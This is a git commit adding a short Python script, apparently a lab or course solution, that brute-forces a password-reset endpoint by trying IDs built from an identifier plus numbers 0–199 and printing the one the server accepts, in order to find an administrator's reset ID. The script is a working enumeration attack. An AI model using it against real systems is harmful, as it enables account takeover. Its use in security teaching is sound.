f040088cb0d236109523f9a20a71304cd37709de
antonimalinowski <antonimalinowski.kontakt@gmail.com>
2023-04-21 13:33:58 +0200

    Rename and fix python script for finding admin's ID with brute force method

---
+++ materials_and_solutions/web_modules/user_authentication/get_admin_id.py
@@ -0,0 +1,13 @@
+﻿import requests
+import sys
+
+if (len(sys.argv) != 3):
+    raise Exception('Syntax: python3 program.py ip_address identifier')
+
+ip_address = sys.argv[1].encode('utf-8')
+identifier = sys.argv[2].encode('utf-8')
+
+for i in range(200):
+    r = requests.get(f'{ip_address}/reset-password?id={identifier}{i}')
+    if 'Password reset ID is invalid' not in r.text:
+        print(i)
